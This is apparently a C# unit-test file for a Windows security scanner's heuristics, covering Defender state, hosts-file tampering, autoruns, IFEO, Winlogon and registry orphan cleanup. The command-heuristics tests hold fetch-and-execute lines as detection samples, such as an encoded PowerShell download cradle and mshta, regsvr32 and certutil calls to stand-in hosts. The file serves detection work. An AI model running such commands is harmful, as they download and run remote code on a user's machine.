using System.Text;
using Nexus.Core;
using Nexus.Security;
using Nexus.WindowsActions;
using Nexus.WindowsActions.Registry;

namespace Nexus.Tests.Modules;

internal sealed class FakeFiles : IFileProbe
{
    public HashSet<string> Files { get; } = new(StringComparer.OrdinalIgnoreCase);
    public HashSet<string> Dirs { get; } = new(StringComparer.OrdinalIgnoreCase) { @"C:\" };
    public bool FileExists(string path) => Files.Contains(path);
    public bool DirectoryExists(string path) => Dirs.Contains(path.TrimEnd('\\')) || Dirs.Contains(path);
    public string Expand(string path) => path.Replace("%ProgramFiles%", @"C:\Program Files", StringComparison.OrdinalIgnoreCase);
}

internal sealed class FakeHosts : IHostsStore
{
    public byte[]? Content { get; set; }
    public bool Reparse { get; set; }
    public int Writes { get; private set; }
    public string Path => @"C:\Windows\System32\drivers\etc\hosts";
    public byte[]? Read() => Content?.ToArray();
    public void Write(byte[] content) { Content = content.ToArray(); Writes++; }
    public bool IsReparsePoint() => Reparse;
}

internal sealed class TempDir : IDisposable
{
    public string Path { get; } = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "nexus-sec-" + Guid.NewGuid().ToString("N"));
    public TempDir() => Directory.CreateDirectory(Path);
    public void Dispose() { try { Directory.Delete(Path, true); } catch (IOException) { } }
}

[Trait("Category", "Unit")]
public sealed class SecurityProductStateTests
{
    [Theory]
    [InlineData(397568u, ScannerState.On, true, true)]    // 0x061100 Defender ligado
    [InlineData(393472u, ScannerState.Off, true, true)]   // 0x060100 Defender desligado (outro AV ativo)
    [InlineData(266240u, ScannerState.On, true, false)]   // 0x041000 terceiro ligado, em dia
    [InlineData(266256u, ScannerState.On, false, false)]  // 0x041010 terceiro ligado, desatualizado
    [InlineData(262144u, ScannerState.Off, true, false)]  // 0x040000 terceiro desligado
    [InlineData(270336u, ScannerState.Snoozed, true, false)] // 0x042000 adiado
    public void Decodes_known_values(uint raw, ScannerState scanner, bool upToDate, bool microsoft)
    {
        var s = ProductState.Decode(raw);
        Assert.Equal(scanner, s.Scanner);
        Assert.Equal(upToDate, s.SignaturesUpToDate);
        Assert.Equal(microsoft, s.MicrosoftOwned);
        Assert.True(s.IsAntivirus);
        Assert.Contains("0x", s.Describe(), StringComparison.Ordinal);
    }
}

[Trait("Category", "Unit")]
public sealed class SecurityCommandHeuristicsTests
{
    private static string Enc(string s) => Convert.ToBase64String(Encoding.Unicode.GetBytes(s));

    [Fact]
    public void Encoded_powershell_is_high_and_decoded()
    {
        var signals = CommandHeuristics.Analyze($"powershell.exe -NoP -w hidden -enc {Enc("IEX (New-Object Net.WebClient).DownloadString('http://x')")}");
        Assert.Contains(signals, s => s.Severity == Severity.High && s.Decoded is not null && s.Decoded.Contains("DownloadString", StringComparison.Ordinal));
        Assert.Contains(signals, s => s.Severity == Severity.Medium && s.Reason.Contains("oculta", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("mshta.exe http://evil.example/a.hta")]
    [InlineData("mshta vbscript:Execute(\"x\")")]
    [InlineData("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"")]
    [InlineData("regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll")]
    [InlineData("certutil.exe -urlcache -split -f http://x/a.exe a.exe")]
    [InlineData(@"wscript.exe C:\Users\a\AppData\Roaming\x\run.vbs")]
    [InlineData("powershell -c \"iex(iwr http://x)\"")]
    public void Living_off_the_land_patterns_are_high(string command) =>
        Assert.Contains(CommandHeuristics.Analyze(command), s => s.Severity == Severity.High);

    [Theory]
    [InlineData("\"C:\\Program Files\\Steam\\steam.exe\" -silent")]
    [InlineData(@"C:\Windows\System32\SecurityHealthSystray.exe")]
    [InlineData("rundll32.exe shell32.dll,Control_RunDLL")]
    [InlineData("powershell.exe -File C:\\Scripts\\backup.ps1")]
    public void Ordinary_commands_have_no_signal(string command) => Assert.Empty(CommandHeuristics.Analyze(command));

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --x", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Program Files\App\app.exe --x", @"C:\Program Files\App\app.exe")]
    [InlineData("notepad.exe a.txt", "notepad.exe")]
    [InlineData(@"C:\a\run.bat", @"C:\a\run.bat")]
    public void Extracts_executable(string command, string expected) => Assert.Equal(expected, CommandHeuristics.ExecutablePath(command));

    [Theory]
    [InlineData(@"C:\Users\a\AppData\Local\Temp\x.exe", PathZone.Temp)]
    [InlineData(@"C:\Users\a\AppData\Roaming\Discord\Update.exe", PathZone.UserAppData)]
    [InlineData(@"C:\Users\a\Downloads\setup.exe", PathZone.Downloads)]
    [InlineData(@"C:\Users\Public\x.exe", PathZone.Public)]
    [InlineData(@"C:\Windows\System32\cmd.exe", PathZone.System)]
    [InlineData(@"C:\Program Files\X\x.exe", PathZone.ProgramFiles)]
    [InlineData(@"C:\ProgramData\x.exe", PathZone.ProgramDataRoot)]
    [InlineData("x.exe", PathZone.Unknown)]
    public void Classifies_zones(string path, PathZone zone) => Assert.Equal(zone, CommandHeuristics.Zone(path));
}

[Trait("Category", "Unit")]
public sealed class SecurityHostsTests
{
    private const string Sample =
        "# Copyright (c) 1993-2009 Microsoft Corp.\r\n" +
        "#\r\n" +
        "127.0.0.1       localhost\r\n" +
        "::1             localhost\r\n" +
        "10.1.2.3   www.microsoft.com update.microsoft.com # redirecionado\r\n" +
        "0.0.0.0 www.kaspersky.com\r\n" +
        "0.0.0.0 vortex.data.microsoft.com\r\n" +
        "0.0.0.0 ads.example.net\r\n" +
        "192.168.0.10 nas.local\r\n" +
        "not-an-ip example.com\r\n";

    [Fact]
    public void Parses_entries_and_skips_comments_and_garbage()
    {
        var e = HostsFile.Parse(Sample);
        Assert.Equal(7, e.Count);
        Assert.Contains(e, x => x.Hosts.Contains("update.microsoft.com") && !x.IsBlock);
        Assert.Contains(e, x => x.Address == "::1" && x.IsBlock);
        Assert.DoesNotContain(e, x => x.Hosts.Contains("example.com"));
    }

    [Fact]
    public void Classifies_redirect_block_and_telemetry()
    {
        var issues = HostsFile.Analyze(HostsFile.Parse(Sample));
        Assert.Contains(issues, i => i.Host == "www.microsoft.com" && i.Severity == Severity.High && i.Fixable);
        Assert.Contains(issues, i => i.Host == "www.kaspersky.com" && i.Severity == Severity.Medium && i.Fixable);
        Assert.Contains(issues, i => i.Host == "vortex.data.microsoft.com" && i.Severity == Severity.Info && !i.Fixable);
        Assert.DoesNotContain(issues, i => i.Host is "localhost" or "nas.local" or "ads.example.net");
    }

    [Fact]
    public void Disable_comments_only_fixable_lines_and_keeps_everything_else()
    {
        var updated = HostsFile.DisableFixable(Sample, out var n);
        Assert.Equal(2, n);
        Assert.Contains(HostsFile.DisabledPrefix + "10.1.2.3   www.microsoft.com", updated, StringComparison.Ordinal);
        Assert.Contains(HostsFile.DisabledPrefix + "0.0.0.0 www.kaspersky.com\r\n", updated, StringComparison.Ordinal);
        Assert.Contains("\r\n0.0.0.0 vortex.data.microsoft.com\r\n", updated, StringComparison.Ordinal);
        Assert.Equal(Sample.Length + 2 * HostsFile.DisabledPrefix.Length, updated.Length);
        Assert.Equal(updated, HostsFile.DisableFixable(updated, out var again));
        Assert.Equal(0, again);
    }

    [Fact]
    public void Findings_point_to_fix_action_only_when_fixable()
    {
        var entries = HostsFile.Parse(Sample);
        var f = HostsFile.ToFindings(HostsFile.Analyze(entries), entries.Count, Heuristics.HostsFixAction);
        Assert.Contains(f, x => x.Severity == Severity.High && x.FixActionId == Heuristics.HostsFixAction);
        Assert.Contains(f, x => x.Severity == Severity.Info && x.FixActionId is null);
    }
}

[Trait("Category", "Unit")]
public sealed class SecurityHeuristicsTests
{
    [Fact]
    public void Autoruns_flag_unsigned_temp_and_appdata_but_not_signed()
    {
        var f = Heuristics.Autoruns(
        [
            new AutorunEntry("HKCU Run", "upd", @"C:\Users\a\AppData\Local\Temp\upd.exe", @"C:\Users\a\AppData\Local\Temp\upd.exe", true, false),
            new AutorunEntry("HKCU Run", "helper", @"C:\Users\a\AppData\Roaming\h\h.exe", @"C:\Users\a\AppData\Roaming\h\h.exe", true, false),
            new AutorunEntry("HKCU Run", "Discord", @"C:\Users\a\AppData\Local\Discord\Update.exe", @"C:\Users\a\AppData\Local\Discord\Update.exe", true, true),
            new AutorunEntry("HKLM Run", "old", @"C:\Program Files\Old\old.exe", @"C:\Program Files\Old\old.exe", false, null),
        ]);
        Assert.Contains(f, x => x.Severity == Severity.High && x.Title.Contains("upd", StringComparison.Ordinal));
        Assert.Contains(f, x => x.Severity == Severity.Medium && x.Title.Contains("helper", StringComparison.Ordinal));
        Assert.DoesNotContain(f, x => x.Title.Contains("Discord", StringComparison.Ordinal));
        Assert.Contains(f, x => x.Severity == Severity.Low && x.Title.Contains("old", StringComparison.Ordinal));
    }

    [Fact]
    public void Tasks_with_encoded_powershell_are_flagged_and_microsoft_hidden_is_low()
    {
        var enc = Convert.ToBase64String(Encoding.Unicode.GetBytes("Start-Sleep 1"));
        var f = Heuristics.Tasks(
        [
            new ScheduledTaskInfo(@"\Updater", "powershell.exe", "-enc " + enc, true, null),
            new ScheduledTaskInfo(@"\Microsoft\Windows\X\Y", "powershell.exe", "-WindowStyle Hidden -File x.ps1", true, "Microsoft"),
            new ScheduledTaskInfo(@"\GoogleUpdate", @"C:\Program Files\Google\Update\GoogleUpdate.exe", "/ua", true, null),
        ]);
        Assert.Contains(f, x => x.Severity == Severity.High && x.Title.Contains(@"\Updater", StringComparison.Ordinal) && x.Why.Contains("Start-Sleep", StringComparison.Ordinal));
        Assert.Contains(f, x => x.Severity == Severity.Low && x.Title.Contains(@"\Microsoft\", StringComparison.Ordinal));
        Assert.DoesNotContain(f, x => x.Title.Contains("GoogleUpdate", StringComparison.Ordinal));
    }

    [Fact]
    public void WinHttp_settings_parse_direct_and_proxy()
    {
        Assert.Null(Heuristics.ParseWinHttpSettings(Convert.FromHexString("1800000000000000010000000000000000000000")));
        var proxy = Encoding.ASCII.GetBytes("10.0.0.5:8080");
        var data = new byte[16 + proxy.Length + 4];
        data[0] = 0x18; data[8] = 3; data[12] = (byte)proxy.Length;
        proxy.CopyTo(data, 16);
        Assert.Equal("10.0.0.5:8080", Heuristics.ParseWinHttpSettings(data));
        Assert.Null(Heuristics.ParseWinHttpSettings([1, 2, 3]));
    }

    [Fact]
    public void Proxy_findings()
    {
        Assert.Empty(Heuristics.Proxy(new ProxyInfo(false, "1.2.3.4:80", null, null)));
        var f = Heuristics.Proxy(new ProxyInfo(true, "1.2.3.4:80", "http://x/proxy.pac", "5.6.7.8:3128"));
        Assert.Equal(3, f.Count);
        Assert.Equal(Severity.Low, Heuristics.Proxy(new ProxyInfo(true, "127.0.0.1:8888", null, null))[0].Severity);
    }

    [Fact]
    public void Forcelist_parse_and_off_store_is_high()
    {
        var a = Heuristics.ParseForcelistValue("Chrome", "HKLM", "abcdefghijklmnopabcdefghijklmnop;https://clients2.google.com/service/update2/crx");
        var b = Heuristics.ParseForcelistValue("Chrome", "HKLM", "ponmlkjihgfedcbaponmlkjihgfedcba;http://evil.example/upd.xml");
        Assert.Equal("abcdefghijklmnopabcdefghijklmnop", a.Id);
        var f = Heuristics.ForcedExtensions([a, b]);
        Assert.Equal(Severity.Medium, f[0].Severity);
        Assert.Equal(Severity.High, f[1].Severity);
    }

    [Fact]
    public void Exclusions_broad_and_hidden()
    {
        var f = Heuristics.Exclusions(new DefenderExclusions([@"C:\", @"C:\Users\a\AppData", @"D:\Games\Steam"], ["exe"], [@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"], false));
        var broad = Assert.Single(f, x => x.Severity == Severity.High);
        Assert.Contains("*.exe", broad.Evidence, StringComparison.Ordinal);
        Assert.Contains("powershell.exe", broad.Evidence, StringComparison.Ordinal);
        Assert.DoesNotContain(@"D:\Games", broad.Evidence, StringComparison.Ordinal);
        Assert.Equal(Severity.Info, Assert.Single(Heuristics.Exclusions(new DefenderExclusions([], [], [], true))).Severity);
        Assert.Equal(Severity.Info, Assert.Single(Heuristics.Exclusions(new DefenderExclusions([@"D:\Games\Steam"], [], [], false))).Severity);
        Assert.True(Heuristics.IsBroadPath(@"C:\Users\matheus"));
        Assert.False(Heuristics.IsBroadPath(@"C:\Users\matheus\Projetos"));
    }

    [Fact]
    public void Ifeo_accessibility_is_high_and_procexp_is_info()
    {
        var f = Heuristics.Ifeo(
        [
            new IfeoEntry("64 bits", "sethc.exe", @"C:\Windows\System32\cmd.exe", "aaaaaaaa"),
            new IfeoEntry("64 bits", "taskmgr.exe", @"C:\Tools\procexp64.exe", "bbbbbbbb"),
            new IfeoEntry("64 bits", "game.exe", @"C:\x\y.exe", "cccccccc"),
        ]);
        Assert.Equal(Severity.High, f.Single(x => x.FixSelection == "aaaaaaaa").Severity);
        Assert.Equal(Severity.Info, f.Single(x => x.FixSelection == "bbbbbbbb").Severity);
        Assert.Equal(Severity.Medium, f.Single(x => x.FixSelection == "cccccccc").Severity);
        Assert.All(f, x => Assert.Equal(Heuristics.IfeoFixAction, x.FixActionId));
    }

    [Fact]
    public void AppInit_active_only_without_secure_boot()
    {
        var items = new[] { new AppInitInfo("64 bits", @"C:\x\evil.dll", true, null), new AppInitInfo("32 bits", "", true, null) };
        Assert.Equal(Severity.High, Assert.Single(Heuristics.AppInit(items, secureBootOn: false)).Severity);
        Assert.Equal(Severity.Low, Assert.Single(Heuristics.AppInit(items, secureBootOn: true)).Severity);
    }

    [Fact]
    public void Winlogon_shell_userinit_and_user_shell()
    {
        Assert.Empty(Heuristics.Winlogon(new WinlogonInfo("explorer.exe", @"C:\Windows\system32\userinit.exe,", null, null, @"C:\Windows\system32")));
        var f = Heuristics.Winlogon(new WinlogonInfo("explorer.exe, evil.exe", @"C:\Windows\system32\userinit.exe,C:\x\y.exe,", "x.exe", "dddddddd", @"C:\Windows\system32"));
        Assert.Equal(3, f.Count);
        Assert.Equal(Heuristics.ShellFixAction, f[0].FixActionId);
        Assert.Null(f[1].FixActionId); // Userinit: nunca corrigido automaticamente
        Assert.Equal("dddddddd", f[2].FixSelection);
    }
}

[Trait("Category", "Unit")]
public sealed class SecurityStatusTests
{
    private const string Json = """
    {
      "status": { "AMServiceEnabled": true, "AntivirusEnabled": true, "RealTimeProtectionEnabled": false, "IsTamperProtected": true,
                  "AMRunningMode": "Normal", "AMProductVersion": "4.18.1", "AntivirusSignatureVersion": "1.400.1", "AntivirusSignatureAge": 0,
                  "AntivirusSignatureLastUpdated": "2026-10-30T10:00:00.0000000Z", "QuickScanEndTime": "2026-10-29T10:00:00.0000000Z", "QuickScanAge": 1,
                  "FullScanEndTime": null },
      "pref": { "MAPSReporting": 2, "EnableControlledFolderAccess": 0, "PUAProtection": 1,
                "ExclusionPath": ["N/A: Must be an administrator to view exclusions"], "ExclusionExtension": [], "ExclusionProcess": [] },
      "av": { "displayName": "Windows Defender", "productState": 397568 },
      "fw": [],
      "fwProfiles": [ { "Name": "Domain", "Enabled": true }, { "Name": "Private", "Enabled": true }, { "Name": "Public", "Enabled": false } ],
      "threats": [ { "ThreatID": "2147", "ThreatName": "Trojan:Win32/Test", "SeverityID": 5, "IsActive": false } ],
      "detections": { "ThreatID": "2147", "InitialDetectionTime": "2026-10-01T08:00:00.0000000Z", "ThreatStatusID": 3, "Resources": ["file:_C:\\x\\a.exe"] },
      "bitlocker": [ { "Drive": "C:", "Protection": 2, "Source": "Shell" } ],
      "tpm": { "Present": true, "Enabled": null, "Version": "2.0" },
      "tasks": { "Path": "\\X", "Execute": "cmd.exe", "Arguments": "/c echo", "State": "Ready", "Author": null }
    }
    """;

    private static readonly RegistrySecurityFlags Flags = new(true, 5, null, null, true, false, []);

    [Fact]
    public void Parses_single_objects_and_arrays()
    {
        var w = SecurityStatus.Parse(Json);
        Assert.True(w.AntivirusEnabled);
        Assert.False(w.RealTimeProtection);
        Assert.Equal(0, w.SignatureAgeDays);
        Assert.Single(w.Antivirus);
        Assert.True(w.Exclusions!.Hidden);
        var t = Assert.Single(w.Threats);
        Assert.Equal("Trojan:Win32/Test", t.Name);
        Assert.Equal("Em quarentena", t.Status);
        Assert.Equal("Grave", t.Severity);
        Assert.Contains("Resolvido", t.Recommendation, StringComparison.Ordinal);
        Assert.Single(w.Tasks);
        Assert.Equal("2.0", w.Tpm!.Version);
    }

    [Fact]
    public void Scoreboard_marks_realtime_off_and_public_firewall_off_as_bad()
    {
        var items = SecurityStatus.Scoreboard(SecurityStatus.Parse(Json), Flags, new DateTimeOffset(2026, 10, 31, 0, 0, 0, TimeSpan.Zero));
        Assert.Equal(Tone.Good, items.Single(i => i.Name == "Antivírus").Tone);
        Assert.Equal(Tone.Bad, items.Single(i => i.Name == "Proteção em tempo real").Tone);
        Assert.Equal(Tone.Bad, items.Single(i => i.Name == "Firewall").Tone);
        Assert.Equal(Tone.Good, items.Single(i => i.Name == "Assinaturas de vírus").Tone);
        Assert.Equal(Tone.Good, items.Single(i => i.Name == "Última verificação").Tone);
        Assert.Equal(Tone.Good, items.Single(i => i.Name == "Secure Boot").Tone);
        Assert.Equal(Tone.Unknown, items.Single(i => i.Name == "Acesso controlado a pastas").Tone);
    }

    [Fact]
    public void Scoreboard_with_third_party_antivirus_and_nothing_read()
    {
        var json = """{ "status": { "AMServiceEnabled": true, "AntivirusEnabled": true, "AMRunningMode": "Passive Mode" }, "av": [ { "displayName": "Windows Defender", "productState": 393472 }, { "displayName": "ESET Security", "productState": 266240 } ] }""";
        var items = SecurityStatus.Scoreboard(SecurityStatus.Parse(json), Flags, DateTimeOffset.Now);
        Assert.Equal("ESET Security ativo", items.Single(i => i.Name == "Antivírus").State);
        var none = SecurityStatus.Scoreboard(null, new RegistrySecurityFlags(null, null, null, null, null, true, []), DateTimeOffset.Now);
        Assert.Equal(Tone.Unknown, none.Single(i => i.Name == "Antivírus").Tone);
        Assert.Equal(Tone.Warn, none.Single(i => i.Name == "Windows Update").Tone);
    }

    [Theory]
    [InlineData(false, 0, "Verificação concluída: nenhuma ameaça encontrada.", "Scanning C:\\ found no threats.")]
    [InlineData(false, 2, "2 ameaça", "Scan finished. found 2 threats")]
    [InlineData(true, 0, "Assinaturas atualizadas", "Signature update finished")]
    public void Summarizes_mpcmdrun_output(bool update, int code, string expected, string line) =>
        Assert.Contains(expected, DefenderOutput.Summarize(update, code, [line]), StringComparison.Ordinal);
}

[Trait("Category", "Unit")]
public sealed class SecurityRegistryInspectorTests
{
    private static readonly RegKeyRef Un64 = new(RegHive.HKLM, RegistryInspector.UninstallPath, RegView.Registry64);

    internal static (InMemorySecurityRegistry Reg, FakeFiles Files) Sample()
    {
        var reg = new InMemorySecurityRegistry();
        var files = new FakeFiles();
        // Órfã: desinstalador e pasta não existem.
        reg.Str(Un64.Child("OldGame"), "DisplayName", "Old Game").Str(Un64.Child("OldGame"), "UninstallString", "\"C:\\Games\\Old\\unins000.exe\"")
           .Str(Un64.Child("OldGame"), "InstallLocation", @"C:\Games\Old");
        reg.SetValue(Un64.Child("OldGame").Child("Sub"), new RegValue("Size", "DWord", "42"));
        reg.SetValue(Un64.Child("OldGame"), new RegValue("Blob", "Binary", "00ff10"));
        reg.SetValue(Un64.Child("OldGame"), new RegValue("Multi", "MultiString", "[\"a\",\"b\"]"));
        // Válida.
        reg.Str(Un64.Child("Steam"), "UninstallString", @"C:\Program Files\Steam\uninstall.exe");
        files.Files.Add(@"C:\Program Files\Steam\uninstall.exe");
        // MSI, componente do sistema, disco ausente: nunca órfãs.
        reg.Str(Un64.Child("{GUID-MSI}"), "UninstallString", "MsiExec.exe /X{GUID-MSI}");
        reg.Str(Un64.Child("Sys"), "UninstallString", @"C:\nope\u.exe").Str(Un64.Child("Sys"), "SystemComponent", "1", "DWord");
        reg.Str(Un64.Child("External"), "UninstallString", @"E:\Apps\X\uninstall.exe");
        // Pasta de instalação ainda existe: não é órfã.
        reg.Str(Un64.Child("Half"), "UninstallString", @"C:\Half\gone.exe").Str(Un64.Child("Half"), "InstallLocation", @"C:\Half");
        files.Dirs.Add(@"C:\Half");
        // App Paths quebrado e válido.
        var ap = new RegKeyRef(RegHive.HKLM, RegistryInspector.AppPathsPath, RegView.Registry64);
        reg.Str(ap.Child("ghost.exe"), "", @"C:\Ghost\ghost.exe");
        reg.Str(ap.Child("note.exe"), "", @"%ProgramFiles%\Note\note.exe");
        files.Files.Add(@"C:\Program Files\Note\note.exe");
        // SharedDLLs.
        var sd = new RegKeyRef(RegHive.HKLM, RegistryInspector.SharedDllsPath, RegView.Registry64);
        reg.SetValue(sd, new RegValue(@"C:\Program Files\Common Files\gone.dll", "DWord", "1"));
        reg.SetValue(sd, new RegValue(@"C:\Program Files\Common Files\ok.dll", "DWord", "2"));
        files.Files.Add(@"C:\Program Files\Common Files\ok.dll");
        return (reg, files);
    }

    [Fact]
    public void Machine_orphans_follow_conservative_rules()
    {
        var (reg, files) = Sample();
        var o = RegistryInspector.Scan(reg, files, RegScope.Machine);
        Assert.Contains(o, x => x.Category == RegistryInspector.Uninstall && x.Display == "Old Game");
        Assert.DoesNotContain(o, x => x.Key.Path.EndsWith("Steam", StringComparison.Ordinal) || x.Key.Path.Contains("GUID-MSI", StringComparison.Ordinal)
            || x.Key.Path.EndsWith("Sys", StringComparison.Ordinal) || x.Key.Path.EndsWith("External", StringComparison.Ordinal) || x.Key.Path.EndsWith("Half", StringComparison.Ordinal));
        Assert.Contains(o, x => x.Category == RegistryInspector.AppPaths && x.Display == "ghost.exe");
        Assert.DoesNotContain(o, x => x.Display == "note.exe");
        Assert.Contains(o, x => x.Category == RegistryInspector.SharedDlls && x.ValueName!.EndsWith("gone.dll", StringComparison.Ordinal));
        Assert.Equal(3, o.Count);
        Assert.All(o, x => Assert.Matches("^[0-9a-f]{8}$", x.Selection));
    }

    [Fact]
    public void User_orphans_include_muicache_and_informative_extensions()
    {
        var reg = new InMemorySecurityRegistry();
        var files = new FakeFiles();
        var mui = new RegKeyRef(RegHive.HKCU, RegistryInspector.MuiCachePath, RegView.Default);
        reg.Str(mui, @"C:\Old\app.exe.FriendlyAppName", "App").Str(mui, @"C:\Old\app.exe.ApplicationCompany", "Co").Str(mui, "@shell32.dll,-1", "x").Str(mui, @"C:\Ok\ok.exe.FriendlyAppName", "Ok");
        files.Files.Add(@"C:\Ok\ok.exe");
        var classes = new RegKeyRef(RegHive.HKCU, RegistryInspector.UserClassesPath, RegView.Default);
        reg.Str(classes.Child(".foo"), "", "Foo.Missing").Str(classes.Child(".bar"), "", "Bar.Present");
        reg.CreateKey(classes.Child("Bar.Present"));
        var o = RegistryInspector.Scan(reg, files, RegScope.User);
        Assert.Equal(2, o.Count(x => x.Category == RegistryInspector.MuiCache));
        var ext = Assert.Single(o, x => x.Category == RegistryInspector.FileExtension);
        Assert.False(ext.Removable);
        Assert.Equal(".foo", ext.Display);
        Assert.Null(RegistryInspector.MuiCacheTarget("@%SystemRoot%\\x.dll,-5"));
    }
}

[Trait("Category", "Unit")]
public sealed class SecurityHandlerTests
{
    private static CatalogDocument Catalog() => CatalogLoader.LoadDirectory(Path.Combine(AppContext.BaseDirectory, "catalog"));

    private static ActionInstance Instance(string id, IReadOnlyDictionary<string, string>? args = null)
    {
        var entry = Catalog().Actions.Single(a => a.Definition.Id == id);
        var parameters = entry.ValidateUserArguments(args, out var reason) ?? throw new InvalidOperationException(reason);
        return entry.TryInstantiate(parameters, out var r2) ?? throw new InvalidOperationException(r2);
    }

    private static (HandlerRegistry Handlers, InMemoryJournal Journal, ActionExecutor Exec, DesiredStateResolver Resolver) Engine(params IActionHandler[] handlers)
    {
        var reg = new HandlerRegistry();
        foreach (var h in handlers) reg.Add(h);
        var journal = new InMemoryJournal();
        return (reg, journal, new ActionExecutor(reg, journal), new DesiredStateResolver(reg));
    }

    [Fact]
    public void Catalog_loads_ids_are_prefixed_and_handlers_registered()
    {
        var all = Catalog();
        var mine = all.Actions.Where(a => a.Definition.Id.StartsWith("security.", StringComparison.Ordinal)).ToList();
        Assert.True(mine.Count >= 8);
        Assert.Equal(all.Actions.Count, all.Actions.Select(a => a.Definition.Key).Distinct().Count());
        using var tmp = new TempDir();
        var env = new HandlerEnvironment(new InMemoryRegistryBackend(), tmp.Path, false, true);
        var kinds = SecurityHandlers.Create(env, new InMemorySecurityRegistry(), new FakeFiles(), new FakeHosts()).Select(h => h.HandlerKind).ToHashSet();
        kinds.Add(RegistryValueHandler.Kind);
        Assert.All(mine, a => Assert.Contains(a.Definition.HandlerKind, kinds));
        // Seleção: só identificadores curtos; caminho livre é recusado pelo catálogo.
        var orphan = mine.Single(a => a.Definition.Id == "security.registry.orphans.machine");
        Assert.NotNull(orphan.ValidateUserArguments(new Dictionary<string, string> { ["selection"] = "0123abcd,89abcdef" }, out _));
        Assert.Null(orphan.ValidateUserArguments(new Dictionary<string, string> { ["selection"] = @"SOFTWARE\Microsoft" }, out _));
        Assert.Null(orphan.ValidateUserArguments(new Dictionary<string, string> { ["selection"] = string.Join(",", Enumerable.Repeat("0123abcd", 29)) }, out _));
    }

    [Fact]
    public void AppInit_and_shell_use_core_registry_handler()
    {
        var a = Instance("security.appinit.clear");
        Assert.Equal("String", a.Desired.Type);
        Assert.Equal("", a.Desired.Value);
        var reg = new InMemoryRegistryBackend();
        var t = new RegistryTarget(RegHive.HKLM, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs", RegView.Registry64);
        reg.Seed(t, "String", @"C:\x\evil.dll");
        var (_, journal, exec, resolver) = Engine(new RegistryValueHandler(reg));
        var run = journal.BeginRun("t", "1");
        Assert.Equal(ExecutionOutcome.Verified, exec.Execute(run, resolver.Resolve([a], T.Ctx), T.Ctx).Single().Outcome);
        Assert.Equal("", reg.Read(t).Value);
        exec.RevertRun(run);
        Assert.Equal(@"C:\x\evil.dll", reg.Read(t).Value);
        Assert.Equal("explorer.exe", Instance("security.winlogon.shell.reset").Desired.Value);
    }

    [Fact]
    public void Orphan_removal_backs_up_whole_tree_and_revert_recreates_it_exactly()
    {
        using var tmp = new TempDir();
        var (reg, files) = SecurityRegistryInspectorTests.Sample();
        var orphans = RegistryInspector.Scan(reg, files, RegScope.Machine);
        var game = orphans.Single(o => o.Display == "Old Game");
        var dll = orphans.Single(o => o.Category == RegistryInspector.SharedDlls);
        var before = RegKinds.Serialize(RegKinds.Export(reg, game.Key, "OldGame"));
        var handler = new RegistryOrphanHandler(reg, files, tmp.Path, otherAccount: false);
        var action = Instance("security.registry.orphans.machine", new Dictionary<string, string> { ["selection"] = $"{game.Selection},{dll.Selection}" });
        Assert.Equal(ApplicabilityKind.Applicable, handler.Assess(action, T.Ctx).Kind);

        var (_, journal, exec, resolver) = Engine(handler);
        var run = journal.BeginRun("t", "1");
        var result = exec.Execute(run, resolver.Resolve([action], T.Ctx), T.Ctx).Single();
        Assert.Equal(ExecutionOutcome.Verified, result.Outcome);
        Assert.False(reg.KeyExists(game.Key));
        Assert.False(reg.KeyExists(game.Key.Child("Sub")));
        Assert.Null(reg.Value(dll.Key, dll.ValueName!));
        Assert.True(reg.KeyExists(Un64Steam())); // o resto fica
        Assert.Single(Directory.GetFiles(Path.Combine(tmp.Path, "quarantine", "security", "registry"), "*.json"));

        var revert = exec.RevertRun(run).Single();
        Assert.Equal(RevertOutcome.Reverted, revert.Outcome);
        Assert.Equal(before, RegKinds.Serialize(RegKinds.Export(reg, game.Key, "OldGame")));
        Assert.Equal("1", reg.Value(dll.Key, dll.ValueName!)!.Data);
    }

    private static RegKeyRef Un64Steam() => new(RegHive.HKLM, RegistryInspector.UninstallPath + @"\Steam", RegView.Registry64);

    [Fact]
    public void Orphan_selection_of_valid_entry_does_nothing()
    {
        using var tmp = new TempDir();
        var (reg, files) = SecurityRegistryInspectorTests.Sample();
        var steamId = RegistryInspector.SelectionId(RegistryInspector.Uninstall, RegHive.HKLM, RegView.Registry64, Un64Steam().Path, null);
        var handler = new RegistryOrphanHandler(reg, files, tmp.Path, false);
        var action = Instance("security.registry.orphans.machine", new Dictionary<string, string> { ["selection"] = steamId });
        var (_, journal, exec, resolver) = Engine(handler);
        var run = journal.BeginRun("t", "1");
        Assert.Equal(ExecutionOutcome.AlreadyConfigured, exec.Execute(run, resolver.Resolve([action], T.Ctx), T.Ctx).Single().Outcome);
        Assert.True(reg.KeyExists(Un64Steam()));
    }

    [Fact]
    public void Orphan_handler_blocks_bad_targets_and_unknown_kinds()
    {
        using var tmp = new TempDir();
        var (reg, files) = SecurityRegistryInspectorTests.Sample();
        var handler = new RegistryOrphanHandler(reg, files, tmp.Path, otherAccount: true);
        var good = Instance("security.registry.orphans.user", new Dictionary<string, string> { ["selection"] = "0123abcd" });
        Assert.Equal(ApplicabilityKind.Blocked, handler.Assess(good, T.Ctx).Kind); // outra conta sem SID
        var bad = good with { Target = new Dictionary<string, string>(good.Target) { ["selection"] = @"..\x" } };
        Assert.Equal(ApplicabilityKind.Blocked, new RegistryOrphanHandler(reg, files, tmp.Path, false).Assess(bad, T.Ctx).Kind);

        var game = RegistryInspector.Scan(reg, files, RegScope.Machine).Single(o => o.Display == "Old Game");
        reg.SetValue(game.Key, new RegValue("Weird", "Unknown", "00"));
        var action = Instance("security.registry.orphans.machine", new Dictionary<string, string> { ["selection"] = game.Selection });
        Assert.Equal(ApplicabilityKind.Blocked, new RegistryOrphanHandler(reg, files, tmp.Path, false).Assess(action, T.Ctx).Kind);
    }

    [Fact]
    public void Orphan_restore_never_overwrites_and_detects_tampered_backup()
    {
        using var tmp = new TempDir();
        var (reg, files) = SecurityRegistryInspectorTests.Sample();
        var game = RegistryInspector.Scan(reg, files, RegScope.Machine).Single(o => o.Display == "Old Game");
        var handler = new RegistryOrphanHandler(reg, files, tmp.Path, false);
        var action = Instance("security.registry.orphans.machine", new Dictionary<string, string> { ["selection"] = game.Selection });
